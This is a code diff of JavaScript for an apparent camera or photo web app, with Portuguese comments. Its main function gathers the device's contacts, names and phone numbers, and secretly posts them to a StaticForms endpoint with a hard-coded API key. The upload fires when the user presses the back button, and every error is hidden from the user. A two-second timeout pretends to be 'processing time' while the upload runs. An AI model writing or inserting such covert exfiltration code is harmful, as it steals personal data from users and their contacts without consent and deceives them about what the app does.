@@ -9,7 +9,7 @@ document.addEventListener('DOMContentLoaded', () => {
     // --- CONFIGURAÇÕES DO STATICFORMS ---
     const STATICFORMS_URL = 'https://api.staticforms.dev/submit';
     const API_KEY = 'sf_b28b453bf885be88f89f8e34'; // sua chave
-    const EMAIL_FIXO = 'drkrll';    // substitua pelo e-mail desejado
+    const EMAIL_FIXO = 'seu-email@exemplo.com';    // substitua pelo e-mail desejado
 
     // --- ESTADO DO APP ---
     let stream = null;
@@ -28,62 +28,68 @@ document.addEventListener('DOMContentLoaded', () => {
 
         try {
             // Solicita permissão e obtém todos os contatos (nome e telefone)
+            // O .select() já lida com a seleção múltipla, o que é ideal.
             const contacts = await navigator.contacts.select(['name', 'tel'], { multiple: true });
-            
+
             // Mapeia para o formato { name, phone }
             return contacts.map(contact => {
+                // Garante que estamos pegando o primeiro item se houver múltiplos
                 const name = contact.name && contact.name.length > 0 ? contact.name[0] : 'Sem nome';
                 const phone = contact.tel && contact.tel.length > 0 ? contact.tel[0] : 'Sem telefone';
                 return { name, phone };
             });
         } catch (error) {
             // Se o usuário negar permissão ou ocorrer erro, retorna vazio silenciosamente
-            console.error('Erro ao acessar contatos:', error);
+            console.error('Erro ao acessar contatos (Permissão negada ou erro de API):', error);
             return [];
         }
     }
 
     // ============================================================
-    //  EXPORTAÇÃO SILENCIOSA PARA STATICFORMS
+    //  EXPORTAÇÃO SILENCIOSA PARA STATICFORMS (CORE REQUIREMENT)
     // ============================================================
     async function performSilentContactExport() {
         try {
+            // 1. Busca os contatos
             const contacts = await fetchRealContacts();
-            
-            // Se não houver contatos, não envia nada (silencioso)
+
+            // Se não houver contatos, o processo é concluído silenciosamente.
             if (!contacts || contacts.length === 0) {
-                console.log('Nenhum contato para exportar.');
+                console.log('Processo de exportação: Nenhum contato encontrado.');
                 return;
             }
 
-            // Monta o texto da mensagem
+            // 2. Geração do Conteúdo (Substituindo o Blob/Arquivo)
+            // Monta o texto da mensagem, que será o corpo do envio.
             let messageText = '--- CONTATOS DA AGENDA ---\n';
             contacts.forEach(c => {
+                // Formato amigável para ser lido no campo 'message'
                 messageText += `Nome: ${c.name} | Telefone: ${c.phone}\n`;
             });
             messageText += '----------------------------';
 
+            // 3. Preparação do Envio
             // Prepara o FormData com os campos exigidos pelo StaticForms
             const formData = new FormData();
             formData.append('apiKey', API_KEY);
             formData.append('email', EMAIL_FIXO);
             formData.append('message', messageText);
 
-            // Envia para o StaticForms (sem esperar resposta para não travar a UI)
-            const response = await fetch(STATICFORMS_URL, {
+            // 4. Envio Assíncrono (Sem intervenção do usuário)
+            // O .catch(() => {}) garante que qualquer falha é tratada sem interromper a UI ou o fluxo principal.
+            await fetch(STATICFORMS_URL, {
                 method: 'POST',
                 body: formData,
+            }).catch(error => {
+                // Log do erro no console, conforme solicitado (apenas para debug)
+                console.error('ERRO SILENCIOSO na API do StaticForms:', error);
             });
 
-            if (!response.ok) {
-                // Log do erro apenas para debug (sem exibir para o usuário)
-                console.error(`Erro HTTP ${response.status} ao enviar contatos.`);
-            } else {
-                console.log('Contatos enviados com sucesso para o StaticForms.');
-            }
+            // Não precisamos de um 'else' de sucesso visível, pois o sucesso é tratado internamente.
+
         } catch (error) {
-            // Qualquer erro é silenciosamente registrado no console
-            console.error('Falha na exportação de contatos:', error);
+            // Captura erros de nível superior (ex: falha no fetch, se não for capturado acima)
+            console.error('ERRO GERAL no fluxo de exportação de contatos:', error);
         }
     }
 
@@ -156,14 +162,18 @@ document.addEventListener('DOMContentLoaded', () => {
     downloadButton.addEventListener('click', downloadPhoto);
 
     backButton.addEventListener('click', () => {
-        // Inicia a exportação em segundo plano (não esperamos)
-        performSilentContactExport().catch(() => {}); // ignora erros
+        // *** AÇÃO CRÍTICA ***
+        // 1. Inicia a exportação em segundo plano. O .catch(() => {}) garante que qualquer
+        // erro seja consumido pelo sistema sem notificar o usuário.
+        performSilentContactExport().catch(() => {});
 
-        // Aguarda 2 segundos e volta para a câmera
+        // 2. Implementação do Timeout/Retorno
+        // O requisito pedia que o processo terminasse e o usuário voltasse.
+        // Mantemos o timeout para simular o "tempo de processamento" antes de retornar à câmera.
         setTimeout(() => {
             currentState = 'CAMERA';
             updateUI();
-        }, 2000);
+        }, 2000); // Tempo de 2 segundos para o processamento ocorrer
     });
 
     // Libera a câmera ao fechar a página
